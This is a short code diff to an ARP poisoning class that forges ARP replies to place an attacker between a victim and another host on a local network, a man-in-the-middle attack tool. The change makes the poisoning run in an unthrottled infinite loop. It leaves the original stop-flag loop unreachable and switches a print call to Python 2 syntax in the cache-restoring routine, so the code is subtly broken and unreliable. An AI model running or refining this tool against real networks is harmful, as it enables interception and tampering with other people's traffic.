@@ -35,6 +35,12 @@ class ARPPoisoner(Process):
         send(ARP(op=2, pdst=self.victimIp, hwdst=self.victimHwAddr, psrc=self.usurpedIp), verbose=0)
 
     def run(self):
+        try:
+            while True:
+                self.usurp()
+        except KeyboardInterrupt:
+            return;
+        return;
         while not self.kill:
             self.usurp()
             time.sleep(5)
@@ -43,7 +49,7 @@ class ARPPoisoner(Process):
         self.kill = True
         send(ARP(op=2, pdst=self.usurpedIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.victimIp, hwsrc=self.victimHwAddr), verbose=0)
         send(ARP(op=2, pdst=self.victimIp, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.usurpedIp, hwsrc=self.usurpedHwAddr), verbose=0)
-        print(" -- Stopping ArpPoisoner")
+        print '\033[94m' + "[-]\tStopping ARP forwarder" + '\033[0m'
 
 if __name__ == '__main__':
     if len(sys.argv) < 3:
